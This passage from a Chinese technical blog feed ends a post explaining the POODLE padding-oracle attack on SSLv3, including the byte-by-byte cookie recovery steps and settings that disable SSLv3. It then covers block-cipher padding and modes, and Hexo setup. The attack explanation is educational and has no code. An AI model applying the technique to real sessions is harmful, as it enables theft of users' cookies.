src="http://cdn.bewindoweb.com/uploadpic/4343d6e74ca6d402f60be08d3af7e425.jpeg" alt="img"></p><p>MAC数据可能并不是刚好8字节，不过无所谓。攻击者并不知道明文，但知道Cookie密文的位置，知道此时想要解密的cookie的最后一个字符在第4个块末尾。然后攻击者将整个块的密文复制到最后一个填充块密文上：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/865b1480ac514fd22f27de5b08825418.jpeg" alt="img"></p><p>然后不断调整前一块（MAC数据）对应密文位置的值，直到通过解密校验，根据SSL的漏洞，此时最后一块最后一个值必然为0x07：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/be0160296022f639c6aa6c25b3917167.jpeg" alt="img"></p><p>这里例子举得不好，0x07密文也是0x07，后面用0x07明、0x07密来区分，此时我们假设未知加密函数为f(x)，其逆为g(y)，那么根据CBC解密流程，有：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token number">0x07</span>明 <span class="token operator">=</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密<span class="token punctuation">)</span> ⊕  <span class="token number">0x01</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x06</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在要求：（此时要注意不是拿0x6E ⊕ g(0x07密）,因为如果解密第四块，应该是第三块 最后一字符⊕g(0x07密））</p><pre class="line-numbers language-c"><code class="language-c">x <span class="token operator">=</span> <span class="token number">0x6E</span> ⊕ <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此x = 0x68，即字符”h”，得到解密明文”h”。</p><p>同理，通过控制请求路径，例如GET /a、GET /aa，不断地把已经解密的Cookie字符挤出，把未知字符留在该块末尾，然后循环进行前述操作，即可得到完整的Cookie字段。</p><h2 id="3-3-Padding验证和MAC验证返回结果不同的情况"><a href="#3-3-Padding验证和MAC验证返回结果不同的情况" class="headerlink" title="3.3 Padding验证和MAC验证返回结果不同的情况"></a><strong>3.3 Padding验证和MAC验证返回结果不同的情况</strong></h2><p>前面的操作都是建立在Padding验证和MAC验证返回结果不同的基础之上，如果返回结果相同，那么MAC会校验不过导致失去判断Padding验证成功的依据。此时攻击者需要利用响应时间的差异来进行判断。如果响应时间仍然相同，那么这种攻击就无效了。</p><h2 id="3-4-POODLE中“降级”的体现"><a href="#3-4-POODLE中“降级”的体现" class="headerlink" title="3**.4 POODLE中“降级”的体现**"></a>3**.4 POODLE中“降级”的体现**</h2><p>POODLE只在SSLv3.0以下版本才容易攻击成功，TLS会检查填充字符，所以TLS构造的padding通过服务器验证概率极低，TLSv1.3以后则完全避免了该漏洞。2014年，TLS已经得到广泛应用，但不乏少数服务器、客户端（比如IE6）和中间网络设备仍然采用SSL协议。因此为了平滑过渡增加用户体验，TLS1.2、TLS1.1、TLS1.0协议实现都会向后兼容SSLv3.0协议，最终协商通信协议为服务端和客户端支持的最高版本协议。如果记录协议中采用的是RC4流加密或者CBC模式的块加密，那么攻击者就可以进行POODLE攻击。</p><h1 id="4-解决方法"><a href="#4-解决方法" class="headerlink" title="4 解决方法"></a>4 解决方法</h1><p>禁用SSL 3.0协议(ssl version ssl3.0 disable)。</p><h2 id="4-1-服务端禁用方法"><a href="#4-1-服务端禁用方法" class="headerlink" title="4.1 服务端禁用方法"></a>4.1 服务端禁用方法</h2><p><strong>（1）Apache 2.x:</strong><br>在mod_ssl配置文件中使用如下命令禁用SSLv2和SSLv3：<br>SSLProtocol All -SSLv2 -SSLv3<br>重启Apache</p><p><strong>（2）Nginx:</strong><br>在配置文件中使用：<br>ssl_protocols TLSv1 TLSv1.1 TLSv1.2;<br>重启Nginx</p><p><strong>（3）lighttpd：</strong><br>确认lighttpd为1.4.29及以上版本<br>在配置文件中使用<br>ssl.use-sslv3 = “disable”<br>重启lighttpd</p><p><strong>（4）tomcat参考:</strong></p><pre><code>https://tomcat.apache.org/tomcat-6.0-doc/ssl-howto.html</code></pre><p><a href="https://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html">https://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html</a></p><p><strong>（5）IIS:</strong><br>查找如下注册表项：<br>HKey_Local_MachineSystemCurrentControlSetControlSecurityProviders SCHANNELProtocols<br>该注册表项通常包含以下子项：</p><ul><li>PCT 1.0</li><li>SSL 2.0</li><li>SSL 3.0</li><li>TLS 1.0<br>每个注册表项都保留适用于该项的协议相关信息。可以在服务器上禁用这些协议中的任一种。为此，</li></ul><p>请在协议SSL 3.0的服务器子项中创建一个新的DWORD值。名称为Enabled,将DWORD值设置为“00 00 00 00”。 重启IIS服务</p><h2 id="4-2-浏览器禁用方法"><a href="#4-2-浏览器禁用方法" class="headerlink" title="4.2 浏览器禁用方法"></a>4.2 浏览器禁用方法</h2><p><strong>（1）IE:</strong><br>“工具” -&gt; “Internet 选项” -&gt; “高级” ，取消”使用 SSL 3.0”的复选框。<br><strong>（2）Chrome:</strong></p><p>复制一个平时打开 Chrome 浏览器的快捷方式，在新的快捷方式上右键点击，进入属性，<br>在”目标”后面的空格中字段的末尾输入以下命令 –ssl-version-min=tls1<br><strong>（3）FireFox:</strong></p><p>在地址栏输入”about:config”，然后将 security.tls.version.min 调至 1。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>1、<a href="https://www.jianshu.com/p/ad8bdd87e131">《Web狗要懂的Padding Oracle攻击》</a>：很详细</p><p>2、<a href="https://www.jianshu.com/p/1851f778e579">《Padding Oracle》</a></p><p>3、[《百度百科：Padding Oracle》](<a href="https://baike.baidu.com/item/Padding">https://baike.baidu.com/item/Padding</a> Oracle/3530091?fr=aladdin)</p><p>4、<a href="https://baike.baidu.com/item/ASCII/309296?fr=aladdin">《ASCII表》</a>和<a href="https://www.23bei.com/tool-531.html">在线异或计算器</a>：便于实验</p><p>5、<a href="https://www.cnblogs.com/xzjf/p/8251651.html">《HTTPS 协议降级攻击原理》</a>：对攻击原理理解透彻</p><p>6、<a href="http://www.vuln.cn/6135">《CVE-2014-3566 SSLv3 POODLE原理分析 – insight-labs》</a>：有些许理解错误，注意辨别</p><p>7、<a href="https://www.imperialviolet.org/2014/10/14/poodle.html">《POODLE attacks on SSLv3 (14 Oct 2014)》</a>：英文原文例子</p><p>8、<a href="https://blog.csdn.net/howeverpf/article/details/40350113">《漏洞分析—SSLv3降级加密协议Padding Oracle攻击（POODLE）技术分析》</a>：例子详细</p><p>9、<a href="http://www.bubuko.com/infodetail-413104.html">《SSLv3 POODLE 攻击分析》</a>：最正确的一篇分析</p><p>10、<a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">《This POODLE Bites: Exploiting The SSL 3.0 Fallback》</a>：Google研究报告原文</p><p>11  <a href="https://www.onebug.org/%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E5%BA%93/87280.html">https://www.onebug.org/%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E5%BA%93/87280.html</a> ：预防办法</p>]]></content>
      
      
      
        <tags>
            
            <tag> TLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分组密码--填充模式</title>
      <link href="/2020/08/31/blockcipher-padding/"/>
      <url>/2020/08/31/blockcipher-padding/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载自 <a href="https://www.jianshu.com/p/16e1cbc0b7a9">https://www.jianshu.com/p/16e1cbc0b7a9</a> </p><p>填充模式不仅仅适用于对称密码，非对称密码也会用到，比如RSA</p><p>分组密码中，需要将明文按指定大小进行分组，由于明文并非指定大小的整数倍，因此在明文的最后一个分组需要将其填充至加密算法所要求的分组大小后进行加密。</p><p>在解密时，按照同样的填充模式将填充的数据去除。</p><p>斜体表示 SunJCE 支持，非斜体为 BouncyCastle 支持</p><a id="more"></a><h3 id="NOPADDING"><a href="#NOPADDING" class="headerlink" title="NOPADDING"></a><em>NOPADDING</em></h3><p>不填充，在此填充下原始数据必须是分组大小的整数倍，非整数倍时无法使用该模式</p><h3 id="PKCS5PADDING，PKCS7PADDING"><a href="#PKCS5PADDING，PKCS7PADDING" class="headerlink" title="PKCS5PADDING，PKCS7PADDING"></a><em>PKCS5PADDING</em>，PKCS7PADDING</h3><p>填充至符合块大小的整数倍，填充值为填充数量数</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</code></li></ul><p><code>PKCS5PADDING</code> 的块大小应为 8 个字节，而 <code>PKCS7PADDING</code> 的块大小可以在 1~255 的范围内。但 SunJCE 的 Provider 实现中 <code>PKCS5PADDING</code> 也按 <code>PKCS7PADDING</code> 来进行处理了。</p><h3 id="ISO10126PADDING"><a href="#ISO10126PADDING" class="headerlink" title="ISO10126PADDING"></a>ISO10126PADDING</h3><p>填充至符合块大小的整数倍，填充值最后一个字节为填充的数量数，其他字节随机处理</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 3F 7A B4 09 14 36 07</code></li></ul><h3 id="ISO7816-4PADDING"><a href="#ISO7816-4PADDING" class="headerlink" title="ISO7816-4PADDING"></a>ISO7816-4PADDING</h3><p>填充至符合块大小的整数倍，填充值第一个字节为 0x80，其他字节填 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 80 00 00 00 00 00 00</code></li></ul><h3 id="ZEROBYTEPADDING"><a href="#ZEROBYTEPADDING" class="headerlink" title="ZEROBYTEPADDING"></a>ZEROBYTEPADDING</h3><p>填充至符合块大小的整数倍，填充值为 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</code></li></ul><h3 id="X923PADDING"><a href="#X923PADDING" class="headerlink" title="X923PADDING"></a>X923PADDING</h3><p>填充至符合块大小的整数倍，填充值最后一个字节为填充的数量数，其他字节填 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</code></li></ul><h3 id="TBCPADDING（Trailing-Bit-Compliment）"><a href="#TBCPADDING（Trailing-Bit-Compliment）" class="headerlink" title="TBCPADDING（Trailing-Bit-Compliment）"></a>TBCPADDING（Trailing-Bit-Compliment）</h3><p>填充至符合块大小的整数倍，原文最后一位为“1”时填充 0x00，最后一位为“0”时填充“0xFF”</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</code></li><li>原始：<code>FF FF FF FF FF FF FF FF F0</code></li><li>填充：<code>FF FF FF FF FF FF FF FF F0 FF FF FF FF FF FF FF</code></li></ul><h3 id="PKCS1PADDING"><a href="#PKCS1PADDING" class="headerlink" title="PKCS1PADDING"></a><em>PKCS1PADDING</em></h3><p>该填充模式是 RSA 加密中使用的，详见 <a href="https://tools.ietf.org/html/rfc2313">RFC 2313</a>。RSA 加密时，需要将原文填充至密钥大小，填充的格式为：</p><pre><code>00 + BT + PS + 00 + D</code></pre><ul><li><code>00</code> 为固定字节</li><li><code>BT</code> 为处理模式。公钥操作时为 <code>02</code>，私钥操作为 <code>00</code> 或 <code>01</code></li><li><code>PS</code> 为填充字节，填充数量为 <code>k - 3 - D</code>，<code>k</code> 表示密钥长度，<code>D</code> 表示原文长度。<code>PS</code> 的最小长度为 8 个字节。填充的值根据 <code>BT</code> 值不同而不同： <ul><li><code>BT = 00</code> 时，填充全 <code>00</code></li><li><code>BT = 01</code> 时，填充全 <code>FF</code></li><li><code>BT = 02</code> 时，随机填充，但不能为 <code>00</code></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分组密码--工作模式</title>
      <link href="/2020/08/31/blockcipher-operation-mode/"/>
      <url>/2020/08/31/blockcipher-operation-mode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载wiki</p><a id="more"></a><h2 id="1-前期知识"><a href="#1-前期知识" class="headerlink" title="1 前期知识"></a>1 前期知识</h2><p>分组密码算法</p><h2 id="2-工作模式"><a href="#2-工作模式" class="headerlink" title="2 工作模式"></a>2 工作模式</h2><p>我们知道分组密码属于对称密码算法，但是每次只能处理特定长度的一块数据的算法，每块都是一个分组，分组的比特数就称为分组长度。因此针对加密的内容超过分组密码的分组长度时，该如何安全加密呢？这时候就需要工作模式来解决这个问题， 分组密码工作模式描述了如何重复加密比较长的多个数据块，工作模式中会用到加密算法，加密算法只是工作模式中的一环节，这里要区分开。</p><p> 常见的分组加密算法有: DES、3DES、AES、IDEA 。</p><p><strong>常见分组密码算法分组长度和密钥长度如下表:</strong></p><table><thead><tr><th>密码算法</th><th>分组长度</th><th>密钥长度</th></tr></thead><tbody><tr><td>DES</td><td>64 bit/8 byte</td><td>64(56+8) bit/8 byte</td></tr><tr><td>3DES</td><td>64 bit/8 byte</td><td>64/64*2/64 * 3 bit</td></tr><tr><td>AES</td><td>128 bit/16 byte</td><td>128/192/256 bit</td></tr></tbody></table><p>经典的工作模式有以下5种。</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598927024511.png" alt="1598927024511"></p><p> <img src="https://img-blog.csdnimg.cn/20200412155237387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9xaWFvbGl1c2h1aUND,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><h3 id="2-1-电子密码本（ECB）"><a href="#2-1-电子密码本（ECB）" class="headerlink" title="2.1 电子密码本（ECB）"></a>2.1 电子密码本（ECB）</h3><p>最简单的加密模式即为<strong>电子密码本</strong>（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</p><p><a href="https://zh.wikipedia.org/wiki/File:Ecb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c4/Ecb_encryption.png" alt="Ecb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ecb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/6/66/Ecb_decryption.png" alt="Ecb decryption.png"></a></p><p>本方法的缺点在于同样的明文块会被加密成相同的密文块；因此，它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。下面的例子显示了ECB在密文中显示明文的模式的程度：该图像的一个位图版本（左图）通过ECB模式可能会被加密成中图，而非ECB模式通常会将其加密成右图。</p><table><thead><tr><th><a href="https://zh.wikipedia.org/wiki/File:Tux.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg" alt="Tux.jpg"></a></th><th><a href="https://zh.wikipedia.org/wiki/File:Tux_ecb.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Tux_ecb.jpg" alt="Tux ecb.jpg"></a></th><th><a href="https://zh.wikipedia.org/wiki/File:Tux_secure.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a0/Tux_secure.jpg" alt="Tux secure.jpg"></a></th></tr></thead><tbody><tr><td>原图</td><td>使用ECB模式加密</td><td>提供了伪随机性的非ECB模式</td></tr></tbody></table><p>右图是使用CBC，CTR或任何其它的更安全的模式加密左图可能产生的结果——与随机噪声无异。注意右图看起来的随机性并不能表示图像已经被安全的加密；许多不安全的加密法也可能产生这种“随机的”输出。</p><p>ECB模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用ECB模式的Blowfish密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。</p><h3 id="2-2-密码块链接（CBC）"><a href="#2-2-密码块链接（CBC）" class="headerlink" title="2.2 密码块链接（CBC）"></a>2.2 密码块链接（CBC）</h3><p>1976年，IBM发明了<strong>密码分组链接</strong>（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><p><a href="https://zh.wikipedia.org/wiki/File:Cbc_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png" alt="Cbc encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Cbc_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/6/66/Cbc_decryption.png" alt="Cbc decryption.png"></a></p><p>若第一个块的下标为1，则CBC模式的加密过程为</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926624504.png" alt="1598926624504"></p><p>而其解密过程则为</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926632436.png" alt="1598926632436"></p><p>CBC是最为常用的工作模式。它的主要缺点在于<strong>加密过程是串行</strong>的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p><p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，<strong>解密过程可以被并行化</strong>，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p><h3 id="2-3-填充密码块链接（PCBC）"><a href="#2-3-填充密码块链接（PCBC）" class="headerlink" title="2.3 填充密码块链接（PCBC）"></a>2.3 填充密码块链接（PCBC）</h3><p><strong>填充密码块链接</strong>（<strong>PCBC</strong>，Propagating cipher-block chaining）或称为<strong>明文密码块链接</strong>（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。</p><p><a href="https://zh.wikipedia.org/wiki/File:Pcbc_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Pcbc_encryption.png" alt="Pcbc encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Pcbc_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Pcbc_decryption.png" alt="Pcbc decryption.png"></a></p><p>加密和解密算法如下：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926657325.png" alt="1598926657325"></p><p>PCBC主要用于Kerberos v4和WASTE中，而在其它场合的应用较少。对于使用PCBC加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5没有使用PCBC。</p><h3 id="2-4-密文反馈（CFB）"><a href="#2-4-密文反馈（CFB）" class="headerlink" title="2.4 密文反馈（CFB）"></a>2.4 密文反馈（CFB）</h3><p><strong>密文反馈</strong>（CFB，Cipher feedback）模式类似于CBC，可以将块密码变为自同步的<a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E5%AF%86%E7%A0%81">流密码</a>；工作过程亦非常相似，CFB的解密过程几乎就是颠倒的CBC的加密过程：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926692468.png" alt="1598926692468"></p><p><a href="https://zh.wikipedia.org/wiki/File:Cfb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Cfb_encryption.png" alt="Cfb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Cfb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/7/75/Cfb_decryption.png" alt="Cfb decryption.png"></a></p><p>上述公式是描述的是最简单的CFB，在这种模式下，它的自同步特性仅仅与CBC相同，即若密文的一整块发生错误，CBC和CFB都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用CFB的自同步性。</p><p>为了利用CFB制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用IV将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高<em>x</em>位与明文的<em>x</em>进行异或，以产生密文的<em>x</em>位。下一步将生成的<em>x</em>位密文移入寄存器中，并对下面的<em>x</em>位明文重复这一过程。解密过程与加密过程相似，以IV开始，对寄存器加密，将结果的高<em>x</em>与密文异或，产生<em>x</em>位明文，再将密文的下面<em>x</em>位移入寄存器。</p><p>下式中Si是移位寄存器的第<em>i</em>个状态，a &lt;&lt; x是指将<em>a</em>移位<em>x</em>位，head(a, x)是指<em>a</em>的高<em>x</em>位，<em>n</em>则是指IV的位数。</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926716035.png" alt="1598926716035"></p><p>若密文的<em>x</em>位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。</p><p>与CBC相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与CBC类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。</p><p>CFB拥有一些CBC所不具备的特性，这些特性与OFB和CTR的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。</p><h3 id="2-5-输出反馈（OFB）"><a href="#2-5-输出反馈（OFB）" class="headerlink" title="2.5 输出反馈（OFB）"></a>2.5 输出反馈（OFB）</h3><p><strong>输出反馈</strong>模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。</p><p>由于XOR操作的对称性，加密和解密操作是完全相同的：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926747469.png" alt="1598926747469"></p><p><a href="https://zh.wikipedia.org/wiki/File:Ofb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Ofb_encryption.png" alt="Ofb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ofb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Ofb_decryption.png" alt="Ofb decryption.png"></a></p><p>每个使用OFB的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对IV进行加密，最后并行的将明文或密文进行并行的异或处理。</p><p>可以利用输入全0的CBC模式产生OFB模式的密钥流。这种方法十分实用，因为可以利用快速的CBC硬件实现来加速OFB模式的加密过程。</p><h3 id="2-6计数器模式（CTR）"><a href="#2-6计数器模式（CTR）" class="headerlink" title="2.6计数器模式（CTR）"></a>2.6计数器模式（CTR）</h3><p>与OFB相似，CTR将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非CTR模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。</p><p>CTR模式的特征类似于OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR适合运用于多处理器的硬件上。</p><p>注意图中的“nonce”与其它图中的IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。</p><p><a href="https://zh.wikipedia.org/wiki/File:Ctr_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Ctr_encryption.png" alt="Ctr encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ctr_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/3/34/Ctr_decryption.png" alt="Ctr decryption.png"></a></p><p>参考文献：</p><p> <a href="https://blog.csdn.net/xiaoqiaoliushuiCC/article/details/105470567">https://blog.csdn.net/xiaoqiaoliushuiCC/article/details/105470567</a> </p><p><a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo踩坑</title>
      <link href="/2020/08/26/hexo-guide/"/>
      <url>/2020/08/26/hexo-guide/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0-引言"><a href="#0-引言" class="headerlink" title="0 引言"></a>0 引言</h1><p><a href="https://hexo.io/zh-cn/docs/tag-plugins">hexo官方指南</a> </p><p><a href="https://juejin.cn/post/6844903777321877511">hexo 命令大全</a>：</p><p><a href="http://moxfive.xyz/yelee/">yelee主题官方使用指南</a></p><p>本博客搭建教程：<a href="https://blog.csdn.net/qq_36759224/article/details/82121420?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight">使用 Github Pages 和 Hexo 搭建自己的独立博客【超级详细的小白教程】</a></p><a id="more"></a><h1 id="1-插入图片"><a href="#1-插入图片" class="headerlink" title="1 插入图片"></a>1 插入图片</h1><p>参考：<a href="https://www.dazhuanlan.com/2019/12/18/5df99e24d6d27/">Hexo 无法加载图片（路径问题）</a></p><p><a href="https://www.jianshu.com/p/7f06d10f2e3e">关于hexo博客图片插件问题</a></p><p><a href="https://www.jianshu.com/p/db02d775aed0">在hexo博客添加图片遇到的坑</a></p><h2 id="1-1-配置文件"><a href="#1-1-配置文件" class="headerlink" title="1.1  配置文件"></a>1.1  配置文件</h2><blockquote><p>根目录配置_config.yml里面的post_asset_folder:false这个选项设置为true。Hexo 提供了一种更方便管理 Asset 的设定：post_asset_folder</p><pre><code>post_asset_folder: true</code></pre></blockquote><h2 id="1-2-安装图片插件"><a href="#1-2-安装图片插件" class="headerlink" title="1.2 安装图片插件"></a>1.2 安装图片插件</h2><p>先卸载 hexo-asset-image: npm uninstall hexo-asset-image</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> https://github.com/CodeFalling/hexo-asset-image --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/hexo-guide/1603260802378.png" alt="1603260802378"></p><p>图片居中</p><pre><code>&lt;style&gt;img &#123;  position:relative;  width:60%;  left:15%;/*left为（img父元素元素的width - img元素自己的width)÷2*/&#125;&lt;/style&gt;</code></pre><h1 id="2-建立-about等页面"><a href="#2-建立-about等页面" class="headerlink" title="2  建立 about等页面"></a>2  建立 about等页面</h1><h1 id="3-使用标签和分类"><a href="#3-使用标签和分类" class="headerlink" title="3 使用标签和分类"></a>3 使用标签和分类</h1><p> <strong>注：文章标签可以添加多个，分类却只能有一个，设置多个只有第一个生效。</strong> </p><h2 id="3-1-标签"><a href="#3-1-标签" class="headerlink" title="3.1 标签"></a>3.1 标签</h2><p>在Hexo博客本地根目录右键选择<code>Git Bash</code>（前提是已安装好<code>Git</code>和<code>Node.js</code>,可参照<a href="https://sogrey.github.io/article/%E5%A6%82%E4%BD%95%E5%9C%A8Github-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E4%B8%BB%E9%A1%B5%EF%BC%9F/">如何在Github Pages搭建个人独立主页？</a>）,输入命令：</p><pre><code>hexo new page tags</code></pre><p>回车，提示：</p><pre><code>INFO  Created: ...\source\tags\index.md</code></pre><p>就创建完成了。在<code>source\</code>目录下会多出一个<code>tags</code>文件夹，里面有一个<code>index.md</code>文件，打开该文件输入如下：</p><pre><code>---title: 标签云date: 2017-01-10 22:54:00type: &quot;tags&quot;comments: true---</code></pre><p>其中：<code>title</code>和<code>date</code>是标题和创建时间，<code>type</code>表示类型，值<code>tags</code>表示这是个标签云页面，<code>comments</code>是是否允许评论，<code>true</code>表示允许评论。</p><p>这样标签云页面已经创建好了，部署试一下：</p><h2 id="3-2-分类"><a href="#3-2-分类" class="headerlink" title="3.2 分类"></a>3.2 分类</h2><h3 id="3-2-1-站点配置"><a href="#3-2-1-站点配置" class="headerlink" title="3.2.1 站点配置"></a>3.2.1 站点配置</h3><p>在站点根目录下的<code>_config.yml</code>里有这么一段：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Directory</span>source_dir: <span class="token function">source</span>public_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中：<code>category_dir: 